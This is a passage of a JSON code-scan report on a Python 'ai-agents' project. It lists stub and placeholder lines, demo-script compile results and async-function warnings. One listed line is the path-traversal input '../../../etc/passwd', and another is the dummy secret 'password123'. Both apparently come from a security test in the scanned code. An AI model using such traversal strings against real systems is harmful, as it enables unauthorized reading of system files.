          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 309,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 311,
          "content": "optimizations_applied.append(\"Implemented efficient message passing with caching\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 619,
          "content": "\"\"\"Get cached discovery result - placeholder for actual cache implementation\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 624,
          "content": "\"\"\"Cache discovery result - placeholder for actual cache implementation\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 626,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 639,
          "content": "'cache_hit_rate': 'Not implemented',  # Would be calculated with Redis"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 640,
          "content": "'memory_usage_mb': 'Not implemented',  # Would use memory profiler"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
          "line": 466,
          "content": "# For now, return empty list as placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
          "line": 472,
          "content": "# For now, return empty list as placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 114,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 119,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 124,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 138,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 144,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 149,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 154,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 163,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 168,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 173,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 178,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 191,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 196,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 205,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 210,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 261,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 266,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 296,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 301,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 306,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 319,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 324,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 329,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 334,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 347,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 352,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 357,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 362,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 375,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 380,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 385,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
          "line": 418,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
          "line": 213,
          "content": "Optimized group-by operation using single pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
          "line": 214,
          "content": "Complexity: O(n) instead of multiple O(n) passes"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
          "line": 363,
          "content": "raise ValueError(f\"Execution not implemented for pattern: {plan.pattern}\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
          "line": 508,
          "content": "passed = sum(1 for r in self.results if r.status == \"pass\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 77,
          "content": "- Username/password"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 101,
          "content": "\"\"\"Authenticate using username/email and password\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 103,
          "content": "password = credentials.get(\"password\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 105,
          "content": "if not identifier or not password:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 354,
          "content": "def _verify_password(self, password: str, password_hash: str) -> bool:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 355,
          "content": "\"\"\"Verify password against hash\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 356,
          "content": "return pwd_context.verify(password, password_hash)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 358,
          "content": "def _hash_password(self, password: str) -> str:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 359,
          "content": "\"\"\"Hash password for storage\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 360,
          "content": "return pwd_context.hash(password)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 410,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 415,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 420,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 425,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 585,
          "content": "# OAuth 2.0 integration (placeholder for future implementation)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 602,
          "content": "raise NotImplementedError(\"OAuth integration coming soon\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 606,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 610,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 614,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\database\\session.py",
          "line": 178,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
          "line": 654,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
          "line": 295,
          "content": "auth = aiohttp.BasicAuth(self.credentials.username, self.credentials.password)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
          "line": 562,
          "content": "return \"1000000\"  # Placeholder vendor code"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
          "line": 567,
          "content": "return \"V001\"  # Placeholder vendor code"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
          "line": 321,
          "content": "return len(csrf_token) > 10  # Placeholder validation"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
          "line": 374,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
          "line": 641,
          "content": "return 0  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
          "line": 663,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
          "line": 605,
          "content": "# For now, return empty dict as placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
          "line": 672,
          "content": "logger.warning(f\"Method {method} not implemented\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
          "line": 311,
          "content": "raise NotImplementedError(\"Subclasses must implement process_document_text\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
          "line": 700,
          "content": "\"learning_rate\": 0.1,  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
          "line": 561,
          "content": "# Placeholder - implement actual Claude API call"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
          "line": 571,
          "content": "# Placeholder - implement actual GPT API call"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
          "line": 581,
          "content": "# Placeholder - implement local model execution"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 263,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 268,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 273,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 379,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 408,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 429,
          "content": "return pattern_templates.get(pattern_name, f\"# TODO: Implement {pattern_name} pattern\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1579,
          "content": "\"../../../etc/passwd\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1594,
          "content": "sensitive_data = \"password123\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1682,
          "content": "\"tests_passed\": 23,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1903,
          "content": "\"passed\": True,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
          "line": 703,
          "content": "# Placeholder implementation"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
          "line": 255,
          "content": "# This is a placeholder for more sophisticated conflict detection"
        }
      ]
    },
    "windows_compatibility": {
      "compatibility_issues": 0,
      "issue_details": []
    },
    "demo_scripts": {
      "demo_scripts_tested": 10,
      "demo_results": [
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\comprehensive_system_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_autonomous_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
          "status": "ok",
          "message": "Script can be compiled successfully"
        }
      ]
    },
    "configuration": {
      "configuration_checked": true,
      "python_version": "3.13.7",
      "config_issues": 0
    },
    "async_patterns": {
      "async_issues_found": 404,
      "async_details": [
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "lifespan",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "http_exception_handler",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "general_exception_handler",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "custom_swagger_ui_html",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "custom_redoc_html",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "health_check",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "get_system_metrics",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "login",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "refresh_token",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "logout",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "process_document",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "batch_process_documents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "get_processing_status",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "get_processing_result",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "classify_document",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "create_webhook",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "list_webhooks",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "get_integration_status",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "upload_and_process_document",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "get_processing_analytics",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "function": "reload_configuration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "root",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "health_check",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "get_network",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "get_metrics",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "get_trading_events",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "get_market_data",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "websocket_endpoint",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "broadcast_updates",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "startup_event",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "connect",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "send_personal_message",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
          "function": "broadcast",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
          "function": "simulate_document_upload",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
          "function": "process_document",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "execute",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_code_validation_safe",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_code_validation_unsafe",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_backup_and_rollback",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_performance_gap_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_code_generation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_autonomous_self_improvement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_capability_mining",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_breakthrough_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_innovation_incubation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_autonomous_coordination",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_autonomous_decision_making",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_adaptive_resource_allocation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_complete_autonomous_workflow",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_safety_integration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
          "function": "test_performance_monitoring",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "function": "test_database",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "function": "test_organization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "function": "test_user",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "call",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "simulate_network_timeout",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "simulate_service_unavailable",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "simulate_resource_exhaustion",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "simulate_data_corruption",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "simulate_authentication_failure",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "simulate_rate_limit_exceeded",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "execute_with_resilience",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "_execute_with_retry",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_network_timeout_recovery",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_circuit_breaker_functionality",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_graceful_degradation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_cascading_failure_prevention",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_data_consistency_during_failures",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_timeout_handling",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_health_check_monitoring",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "test_recovery_time_benchmarks",
          "issue": "no_event_loop"
        },
        {
